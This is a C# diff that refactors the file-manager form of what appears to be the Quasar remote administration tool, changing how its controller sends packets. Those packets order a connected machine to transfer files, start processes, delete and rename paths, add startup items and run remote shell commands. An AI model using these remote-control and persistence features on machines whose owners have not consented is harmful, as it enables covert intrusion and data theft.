@@ -5,6 +5,8 @@ using System.IO;
 using System.Linq;
 using System.Threading;
 using System.Windows.Forms;
+using Quasar.Common.Enums;
+using Quasar.Common.Packets;
 using xServer.Controls;
 using xServer.Core.Commands;
 using xServer.Core.Data;
@@ -69,7 +71,7 @@ namespace xServer.Forms
             if (_connectClient != null)
             {
                 this.Text = WindowHelper.GetWindowTitle("File Manager", _connectClient);
-                new Core.Packets.ServerPackets.GetDrives().Execute(_connectClient);
+                _connectClient.Send(new GetDrives());
             }
         }
 
@@ -122,7 +124,7 @@ namespace xServer.Forms
 
                     if (_connectClient != null)
                     {
-                        new Core.Packets.ServerPackets.DoDownloadFile(path, id).Execute(_connectClient);
+                        _connectClient.Send(new DoDownloadFile {RemotePath = path, Id = id});
 
                         AddTransfer(id, "Download", "Pending...", files.SubItems[0].Text);
                     }
@@ -200,9 +202,14 @@ namespace xServer.Forms
                                 byte[] block;
                                 if (srcFile.ReadBlock(currentBlock, out block))
                                 {
-                                    new Core.Packets.ServerPackets.DoUploadFile(id,
-                                        remotePath, block, srcFile.MaxBlocks,
-                                        currentBlock).Execute(_connectClient);
+                                    _connectClient.SendBlocking(new DoUploadFile
+                                    {
+                                        Id = id,
+                                        RemotePath = remotePath,
+                                        Block = block,
+                                        MaxBlocks = srcFile.MaxBlocks,
+                                        CurrentBlock = currentBlock
+                                    });
                                 }
                                 else
                                 {
@@ -233,8 +240,7 @@ namespace xServer.Forms
                 {
                     string path = GetAbsolutePath(files.SubItems[0].Text);
 
-                    if (_connectClient != null)
-                        new Core.Packets.ServerPackets.DoProcessStart(path).Execute(_connectClient);
+                    _connectClient?.Send(new DoProcessStart {ApplicationName = path});
                 }
             }
         }
@@ -256,8 +262,12 @@ namespace xServer.Forms
                         {
                             newName = GetAbsolutePath(newName);
 
-                            if (_connectClient != null)
-                                new Core.Packets.ServerPackets.DoPathRename(path, newName, type).Execute(_connectClient);
+                            _connectClient?.Send(new DoPathRename
+                            {
+                                Path = path,
+                                NewPath = newName,
+                                PathType = type
+                            });
                         }
                         break;
                 }
@@ -280,8 +290,7 @@ namespace xServer.Forms
                         case PathType.Directory:
                         case PathType.File:
                             string path = GetAbsolutePath(files.SubItems[0].Text);
-                            if (_connectClient != null)
-                                new Core.Packets.ServerPackets.DoPathDelete(path, type).Execute(_connectClient);
+                            _connectClient?.Send(new DoPathDelete {Path = path, PathType = type});
                             break;
                     }
                 }
@@ -302,9 +311,12 @@ namespace xServer.Forms
                     {
                         if (frm.ShowDialog() == DialogResult.OK)
                         {
-                            if (_connectClient != null)
-                                new Core.Packets.ServerPackets.DoStartupItemAdd(AutostartItem.Name, AutostartItem.Path,
-                                    AutostartItem.Type).Execute(_connectClient);
+                            _connectClient?.Send(new DoStartupItemAdd
+                            {
+                                Name = AutostartItem.Name,
+                                Path = AutostartItem.Path,
+                                Type = AutostartItem.Type
+                            });
                         }
                     }
                 }
@@ -334,14 +346,14 @@ namespace xServer.Forms
 
                 if (_connectClient.Value.FrmRs != null)
                 {
-                    new Core.Packets.ServerPackets.DoShellExecute(string.Format("cd \"{0}\"", path)).Execute(_connectClient);
+                    _connectClient.Send(new DoShellExecute {Command = $"cd \"{path}\""});
                     _connectClient.Value.FrmRs.Focus();
                 }
                 else
                 {
                     FrmRemoteShell frmRS = new FrmRemoteShell(_connectClient);
                     frmRS.Show();
-                    new Core.Packets.ServerPackets.DoShellExecute(string.Format("cd \"{0}\"", path)).Execute(_connectClient);
+                    _connectClient.Send(new DoShellExecute {Command = $"cd \"{path}\""});
                 }
             }
         }
@@ -366,8 +378,7 @@ namespace xServer.Forms
 
                 if (transfer.SubItems[TRANSFER_TYPE].Text == "Download")
                 {
-                    if (_connectClient != null)
-                        new Core.Packets.ServerPackets.DoDownloadFileCancel(id).Execute(_connectClient);
+                    _connectClient?.Send(new DoDownloadFileCancel {Id = id});
                     if (!CommandHandler.CanceledDownloads.ContainsKey(id))
                         CommandHandler.CanceledDownloads.Add(id, "canceled");
                     if (CommandHandler.RenamedFiles.ContainsKey(id))
@@ -460,14 +471,19 @@ namespace xServer.Forms
                             decimal progress =
                                 Math.Round((decimal)((double)(currentBlock + 1) / (double)srcFile.MaxBlocks * 100.0), 2);
 
-                            UpdateTransferStatus(index, string.Format("Uploading...({0}%)", progress), -1);
+                            UpdateTransferStatus(index, $"Uploading...({progress}%)", -1);
 
                             byte[] block;
                             if (srcFile.ReadBlock(currentBlock, out block))
                             {
-                                new Core.Packets.ServerPackets.DoUploadFile(id,
-                                    remotePath, block, srcFile.MaxBlocks,
-                                    currentBlock).Execute(_connectClient);
+                                _connectClient.SendBlocking(new DoUploadFile
+                                {
+                                    Id = id,
+                                    RemotePath = remotePath,
+                                    Block = block,
+                                    MaxBlocks = srcFile.MaxBlocks,
+                                    CurrentBlock = currentBlock
+                                });
                             }
                             else
                             {
@@ -662,7 +678,7 @@ namespace xServer.Forms
             if (!_connectClient.Value.ReceivedLastDirectory)
                 _connectClient.Value.ProcessingDirectory = false;
 
-            new Core.Packets.ServerPackets.GetDirectory(_currentDir).Execute(_connectClient);
+            _connectClient.Send(new GetDirectory {RemotePath = _currentDir});
             SetStatus("Loading directory content...");
             _connectClient.Value.ReceivedLastDirectory = false;
         }
